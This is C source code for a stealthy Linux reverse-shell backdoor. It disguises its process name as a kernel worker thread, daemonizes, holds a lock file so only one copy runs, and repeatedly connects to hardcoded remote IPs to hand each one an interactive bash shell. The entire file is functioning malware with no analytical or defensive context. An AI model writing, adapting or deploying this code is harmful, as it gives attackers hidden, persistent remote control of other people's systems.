#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/file.h>
#include <sys/prctl.h>
#include <pthread.h>

#define SERVER_PORT 51234
#define SLEEP_TIME 10
#define LOCK_FILE "/tmp/.system-lock"

const char *SERVER_IPS[] = {
    "185.xxx.xxx.1",
    "185.xxx.xxx.2",
    "185.xxx.xxx.3"
};
#define NUM_IPS (sizeof(SERVER_IPS) / sizeof(SERVER_IPS[0]))

void hide_process() {
    prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0);
}

void setup_tty() {
    struct termios ts;
    tcgetattr(0, &ts);
    cfmakeraw(&ts);
    tcsetattr(0, TCSANOW, &ts);
    struct winsize ws = {30, 120, 0, 0};
    ioctl(0, TIOCSWINSZ, &ws);
}

int check_single_instance() {
    int fd = open(LOCK_FILE, O_CREAT | O_RDWR, 0644);
    if (fd < 0) return 0;
    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
        close(fd);
        return 0;
    }
    return 1;
}

int connect_to_server(const char *ip, int port) {
    int sock;
    struct sockaddr_in server;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return -1;
    }

    return sock;
}

void *connect_thread(void *arg) {
    const char *ip = (const char *)arg;
    int sock;
    
    while (1) {
        sock = connect_to_server(ip, SERVER_PORT);
        if (sock >= 0) {
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            setup_tty();
            execl("/bin/bash", "bash", "-i", NULL);
            close(sock);
        }
        sleep(SLEEP_TIME);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t threads[NUM_IPS];
    pid_t pid;
    int i;

    if (!check_single_instance()) exit(0);
    hide_process();

    if (getppid() != 1) {
        pid = fork();
        if (pid > 0) exit(0);
        setsid();
        if (chdir("/") != 0) exit(1);
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
    }

    for (i = 0; i < NUM_IPS; i++) {
        pthread_create(&threads[i], NULL, connect_thread, (void *)SERVER_IPS[i]);
    }

    for (i = 0; i < NUM_IPS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
